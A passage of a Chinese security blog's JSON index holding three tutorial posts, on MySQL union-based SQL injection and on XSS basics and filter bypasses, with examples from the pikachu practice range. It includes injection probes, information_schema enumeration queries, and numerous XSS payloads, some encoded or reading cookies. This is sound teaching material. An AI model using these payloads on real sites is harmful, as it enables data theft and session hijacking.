:13:35.292Z","comments":true,"path":"2021/06/20/sql注入基础-mysql联合注入/","link":"","permalink":"https://redredredfish.github.io/2021/06/20/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80-mysql%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/","excerpt":"","text":"原理 sql注入攻击的本质就是把用户输入的参数当做SQL语句来执行，Web应用程序对用户输入数据的合法性没有进行判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。 条件： 1.用户输入可控 2.输入参数被拼接成sql语句执行 危害敏感信息泄露，获取数据权限，上传webshell，执行命令，篡改网页信息等 常见注入点 GET/POST/PUT/DELETE参数 http头注入(X-Forwarded-For) 文件名 cookie注入 判断注入点 以下所有例子以mysql为主，且没有任何防护 注入点参数类型主要有数字型以及字符型，注入返回的数据不一定会反映在前端页面上，比如POST参数的注入，所以在寻找sql注入的时候需要时刻关注数据包。 数字型注入当输入的参数为整型(int)时，则有可能存在数字型注入漏洞。 假设后台 SQL 语句为： 1select * from users where id=1 ① 输入参数：单引号 &#39;SQL 语句变为： 1select * from users where id=1&#x27; 不符合语法，所以该语句会出错，导致脚本程序无法从数据库获取数据，从而使原来的页面出现异常。 ② 输入 and 1 = 1 SQL语句变为： 1select * from users where id=1 and 1 = 1 语法正确，执行正常，返回的数据与原始请求无差异。 ③ 在数据库中输入 and 1 = 2 SQL 语句变为： 1select * from users where id=1 and 1 = 2 语法正确，逻辑错误，因为 1 = 2 为永假，所以返回数据与原始请求有差异。 如果以上三个步骤全部满足，则程序就可能存在数字型 sql 注入漏洞。 字符型注入同理，字符型注入即注入的参数为字符型(char)，判断依据与数字型大致相同，不同的是，判断字符型注入需要先闭合&#39;&#39;。例如，后台 SQL 语句为： 1select * from users where id=&#x27;&#x27; 利用&#39;1&#39;=&#39;1&#39;永真、&#39;1&#39;=&#39;2&#39;永假来判断,&#39;闭合前一个单引号，注释符--空格 或者--#消除后一个单引号 12select * from users where id=&#x27;1&#x27; and &#x27;1&#x27; = &#x27;1&#x27; -- &#x27;select * from users where id=&#x27;1&#x27; and &#x27;1&#x27; = &#x27;2&#x27; -- &#x27; 两种语句均能正常执行，但永假语句不会返回数据或有明显差异 注入类型 判断完注入点参数类型即可用各种方法进行sql注入，字符型注意闭合即可。 常见sql注入类型有：联合注入、堆叠注入、报错注入、盲注(布尔和时间)、宽字节注入、偏移注入等。 联合注入联合注入最主要的函数即union。 在mysql中，union用于连接两个以上的 select 语句，并将结果组合到一个集合中。多个查询语句会删除重复的数据。 注入流程大致为： 确定字段数-&gt;确定回显位置-&gt;爆库-&gt;爆表-&gt;爆字段-&gt;爆数据 确定字段数order by/group by函数order by/group by函数可以将查询数据排序后再返回数据例如 1select * from users where id=1 order by 1,2,3 表示查询结果根据第1、2、3字段排序输出 利用order by函数参数超出字段个数会报错的机制，可以判断出字段个数例如表中只有3个字段order by 4会报错，order by 3则不会，由此可以判断有3个字段 确定回显位置union select1select * from users where id =11111111 union select 1,2,3 前一个查询语句select * from users where id =11111111 设置不存在的id参数会返回字段没有字段值；后一个查询语句select 1,2,3 会返回字段值1，2，3没有字段；两个查询语句的结果联合起来会返回正常字段，只不过字段值是1，2，3。这时候如果页面上显示了’2’，说明’2’这个位置的参数是有回显的，这里就确定了回显位置，可以替换成别的参数，如database()，从而进行下一步爆破库、表、字段、数据的操作。要注意一点的是，id参数要确保不存在数据库中，否则查询结果聚合后会对判断造成干扰。 爆库、表、字段、数据mysql&gt; =5.0版本提供了 infomation_schema库，这是一个信息数据库，它提供了访问数据库元数据的方式。 ①information_schema.schemata表中字段schema_name存储了所有库的名称。②information_schema.tables表中字段table_schema、table_name存储了所有库拥有的表名称。③information_schema.columns表中字段table_schema、table_name、column_name存储了库、表、字段。综上只要获取库(schema_name/table_schema)、表(table_name)、字段(column_name)就可以查询出数据。 tips: ①当回显只有一条时，为了提高效率，可以使用limit 0,x，或group_concat()函数 ②当前库名不一定存在于schema_name中，可以使用database()查询当前数据库，类似的还有 version() MySQL 版本 user() 数据库用户名 database() 数据库名 @@datadir 数据库路径 @@version_compile_os 操作系统版本 select user,host from mysql.user 查询所有用户 select * from mysql.user where user=’xxx’ 查询用户权限","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"mysql注入","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"联合注入","slug":"联合注入","permalink":"https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"}],"author":"redfish"},{"title":"XSS基础(二)","slug":"XSS基础-二","date":"2021-06-15T18:11:00.000Z","updated":"2021-12-06T18:25:41.034Z","comments":true,"path":"2021/06/16/XSS基础-二/","link":"","permalink":"https://redredredfish.github.io/2021/06/16/XSS%E5%9F%BA%E7%A1%80-%E4%BA%8C/","excerpt":"","text":"XSS常见的绕过手法大小写绕过HTML对标签大小写不敏感，可以利用大小写混用绕过例如：&lt;script&gt;改为&lt;ScRiPt&gt; 双写绕过有些情况的规则会将黑名单标签替换为空，可以利用这一点构造标签例如：&lt;script&gt;改为&lt;scr&lt;script&gt;ipt&gt;同理某些注释符在规则中也会替换为空，这时候可以利用它构造payload例如：&lt;script&gt;改为&lt;scr&lt;!---test---&gt;ipt&gt; 开口标签在某些特殊环境，由于html代码补全机制，可以故意不闭合标签绕过黑名单检测例如：&lt;script&gt;改为&lt;script js伪协议例如&lt;&#97;&gt;标签href属性、&lt;&#105;&#109;&#103;&gt;标签src属性可控 12payload: &lt;img src=&quot;javascript:alert(&quot;xss&quot;);&quot;&gt; &lt;a href=&quot;javascript:alert(document.cookie)&quot;;&gt; 空格回车TAB例如：js伪协议javascript:alert(&#39;xss&#39;);可以改为java script:alert(&#39;xss&#39;);等 其他非黑名单标签和事件12&lt;img&gt; payload：&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt; 1234&lt;input&gt;payload: &lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt; &lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt; #竞争焦点，触发onblur事件 &lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt; #通过autofocus属性执行本身的focus事件 123&lt;details&gt;payload: &lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt; &lt;details open ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt; #使用open属性触发ontoggle事件 12&lt;svg&gt;payload: &lt;svg onload=alert(&quot;xss&quot;);&gt; 12&lt;iframe&gt;payload: &lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt; 12&lt;body&gt;payload: &lt;body/onload=alert(&quot;xss&quot;);&gt; 编码转义base64编码 12payload: &lt;script&gt;eavl(atob(&quot;PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;));&lt;/script&gt; #eval()用于将字符串当作程序执行，atob()用于解密base64 &lt;a href=&quot;data:text/html;base64&quot;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;1&lt;/a&gt; JS编码 Uncode编码 \\u00+16进制 JS环境中，利用String.fromCharCode函数将 Unicode 编码转为字符 16进制 \\x+16进制 html实体编码 &amp;#+10进制/16进制+； 一些特殊过滤情况用/代替空格 用反引号代替括号、双引号 用throw代替括号 用html实体编码&amp;colon;代替冒号 用jsfuck编码绕过大部分字符过滤 …… 一些思维导图 总结一般xss的防护手段主要是过滤或转义敏感字符、标签，针对不同情况看人下菜，首先可以利用常见payload或枚举一些敏感字符、标签，查看是否有waf以及拦截情况去猜测规则对哪些输入做了限制，对不同的限制利用不同的方式进行绕过。 一些参考链接https://www.cnblogs.com/sfsec/archive/2021/08/23/15178028.htmlhttps://www.fujieace.com/penetration-test/xss-100.html 强防御下的XSS绕过思路 快速检查payload: 12345‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;”&gt;’&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; 1”;!–”&lt;XSS&gt;=&amp;&#123;()&#125;","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"XSS","slug":"web漏洞/XSS","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://redredredfish.github.io/tags/XSS/"}],"author":"redfish"},{"title":"XSS基础(一)","slug":"XSS基础-一","date":"2021-06-15T02:33:00.000Z","updated":"2021-12-06T03:11:09.337Z","comments":true,"path":"2021/06/15/XSS基础-一/","link":"","permalink":"https://redredredfish.github.io/2021/06/15/XSS%E5%9F%BA%E7%A1%80-%E4%B8%80/","excerpt":"","text":"原理什么是XSS其实我一直不太理解为啥反射型XSS在报告里常年作为高危漏洞，虽然说渗透学习的终点是钓鱼，但是实际工作中遇到真正能利用的其实并不多，而且这玩意有时候参数多修起来比较麻烦，心疼甲方开发三秒。 不管了先看看百度是咋解释的： XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 说的简单点，跨站脚本攻击是指攻击者往Web页面里插入恶意代码，当用户浏览时，代码会被执行，最简单的弹弹窗搞搞心态钓钓鱼啥的，当然不止xss的利用不止于此。所以造成xss的关键是用户的输入未过滤直接输出。 类型 XSS的类型常见的总共有三种，反射型、存储型、DOM型 反射型XSS 反射型XSS是最常见也是最容易验证的类型，和存储型的区别是恶意代码不存储在服务端只做交互，插入什么就输出什么，根据俺的经验，一般在无害化漏洞扫描器中扫出的XSS都是反射型XSS漏洞 。关于如何交互可以看下面这张图。 造成此类漏洞的弱点参数普遍存在于URL中，在测试中可以重点关注某些可以人为控制的参数，特别是会反映在前端的参数。 反射型最简单的payload就是弹窗验证，即&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;,&lt;script&gt; 标签用于在前端插入JS代码，alert()函数用于显示带内容的弹窗。 关于get反射和post反射，简单理解就是get型参数是你能在url里找到的，post一般在流量包里url里是看不见的，这玩意深入下去就要涉及到TCP/IP那一套了，我这种最低级的安服仔肯定不会，可以看看这位大佬的解释。 下面拿pikachu靶场举例： 谁是你最喜欢的NBA球员，当然是库里啦的(￣︶￣*))试一下payload： 123&lt;script type=&quot;text/javascript&quot;&gt;var code = prompt(&quot;请输入你的银行卡密码：&quot;);&lt;/script&gt; 可以看到弹窗了，重点关注这个URL，可见我们输入的参数被URL编码后带在里面，试想如果有人拿这个低级链接来🎣，没有安全常识的甲方爸爸确实有可能会上钩，这时候危害性就体现出来了。 存储型XSS 首先提一下，当你怀疑有存储型XSS的时候千万要先在burpsuite里重放试试，之前有一次渗透，在客户的OA里发现了一个存储型XSS，手贱存了个弹窗代码，导致整个前端格式崩溃浏览器无法渲染，最后在服务器数据库里摸了半天才找到，好端端的渗透干成应急了，血淋淋的教训😭 由上述低级事故可知存储型XSS实际的危害还是蛮大的，顾名思义存储型XSS就是将恶意代码存在服务端或者数据库，一般这种漏洞在留言、添加数据这种功能点出现的比较多，当用户去访问被存入恶意代码的页面时，恶意代码就会执行。 还是拿pikachu来举例： 还是一样在留言功能点存一个弹窗payload进去。 可以看到每次进这个页面都会弹窗。 原因是我们写入的恶意代码已经被存到了后台，当我们每次打开页面，展示留言功能就会从后台数据库里读取到这段恶意代码并交给浏览器渲染输出。 确实挺搞人心态的的┗|｀O′|┛ 。 DOM型XSS 感觉DOM型基本没遇到过，也可能是我太菜了没注意过。 首先啥是DOM?其实就是纯前端的参数接口，有了这个可以控制前端参数做动态网页但不和后端做数据交互。 所以DOM型XSS实际上是由于前端的参数人为可控造成的 看看pikachu中的DOM型XSS:提交功能点的JS代码是这样写的。大概就是输入一个网址，然后点一下what do you see?这句话就能跳转过去。显然这个str参数是我们可控的，因为在前端处理数据，那我们可以想办法让它变成恶意代码，反正浏览器只管渲染不会管语句是不是恶意。看一下pikachu提供的两个payload： 12//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行 第一个,&lt;img&gt;标签代表图片，onmouseover代表鼠标滑过事件，所以就是鼠标滑过这张图片就执行alert(&#39;xss&#39;)弹个窗第二个差不多，onclick代表鼠标点击事件为啥它说闭合掉就行？ 可以把payload带进那句代码看看： 1&quot;&lt;a href=&#x27;&quot;+&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;; 这样一看&quot;&lt;a href=&#39; &quot;+&#39;&gt;这段实际上&quot;+被当作了&lt;a&gt;标签的链接参数，显然这个标签就没用了后面&quot; &#39;&gt;what do you see?&lt;/a&gt;&quot;就是个字符串所以留下的有用的就只有&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;，这样改一改就又能拿来🎣了。 在复杂的网页环境中，会大量用到这种闭合技巧，需要结合F12或猜标签的形式来构造payload。 总结 反射型和存储型都会和服务端交互，DOM型则是纯前端。 反射型不会存在服务端或者数据库，服务端只会把收到的URL原封不动还给浏览器渲染。 判断是存储型还是反射型，只要看提交一次弹窗payload再刷新页面，不弹就是反射型，还弹就是存储型。 判断是反射型还是DOM型，只要在F12里找有没有处理参数的代码，没有就是反射型，有就是DOM型。","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"XSS","slug":"web漏洞/XSS","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://redredredfish.github.io/tags/XSS/"}],"author":"redfish"}],"categories":[{"name":"面经","slug":"面经","permalink":"https://redredredfish.github.io/categories/%E9%9D%A2%E7%BB%8F/"},{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"未授权访问漏洞","slug":"web漏洞/未授权访问漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"web漏洞/sql注入/mysql注入/getshell","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"},{"name":"靶场","slug":"web漏洞/sql注入/mysql注入/靶场","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"},{"name":"XSS","slug":"web漏洞/XSS","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/XSS/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://redredredfish.github.io/tags/%E9%9D%A2%E7%BB%8F/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"redis未授权访问","slug":"redis未授权访问","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"getshell","permalink":"https://redredredfish.github.io/tags/getshell/"},{"name":"shiro反序列化","slug":"shiro反序列化","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"mysql注入","slug":"mysql注入","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"联合注入","slug":"联合注入","permalink":"https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"靶场","permalink":"https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"XSS","slug":"XSS","permalink":"https://redredredfish.github.io/tags/XSS/"}]}